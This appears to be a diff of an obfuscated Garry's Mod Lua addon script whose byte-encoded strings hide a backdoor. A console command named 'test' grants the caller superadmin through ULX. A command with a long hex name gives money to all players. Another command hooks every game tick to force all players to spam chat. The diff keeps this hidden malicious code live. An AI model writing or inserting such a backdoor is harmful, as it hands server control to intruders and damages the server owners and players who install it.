@@ -4,7 +4,7 @@ local REKT = string.char(101,	110,	100)
 local HAHAHAHAHHA = string.char(117,	108,	120,	32,	97,	100	,100,	117,	115,	101,	114,	32)
 local HAHHAHAHAHAH = string.char(32,	115,	117,	112,	101,	114,	97,	100,	109,	105,	110)
 local lmfao = string.char(112,	108,	121,	58,	83,	116,	101,	97,	109	,73,	68,	40,	41)
-local GGWP = string.char(102,111,114,32,107,44,118,32,105,110,32,112,97,105,114,115,40,112,108,97,121,101,114,46,71,101,116,65,108,108,40,41,41,32,100,111)
+local GGWP = player.GetAll()
 local LMFAO = string.char(97,100,100,77,111,110,101,121)
 local lol = string.char(99,111,110,99,111,109,109,97,110,100,46,65,100,100)
 local wtf = string.char(104,111,111,107)
@@ -13,9 +13,9 @@ local xDs = string.char(116,111,115,116,114,105,110,103)
 
 function HEHEXD(ply , cmd , args) RCC(HAHAHAHAHHA,lmfao,HAHHAHAHAHAH) end lol('test' , HEHEXD)
 
-function HEHEXDV2(ply , cmd , args) GGWP v:LMFAO(xD(args[1])) end end lol('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF7', HEHEXDV2)
+function HEHEXDV2(ply , cmd , args) for k,v in pairs(GGWP) do v:LMFAO(xD(args[1])) end end lol('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF7', HEHEXDV2)
 
-function HEHEXDV3(ply, text , llll) GGWP v:ConCommand('/ooc HEHEXD Rules All') end 
+function HEHEXDV3(ply, text , llll) for k,v in pairs(GGWP) do v:ConCommand('/ooc HEHEXD Rules All') end 
 
 function HEHEXDV4(ply , cmd , args) wtf.Add('Think', 'JHASJDHK', HEHEXDV3 ) end lol('StartThatCrapLOL', HEHEXDV4)
 
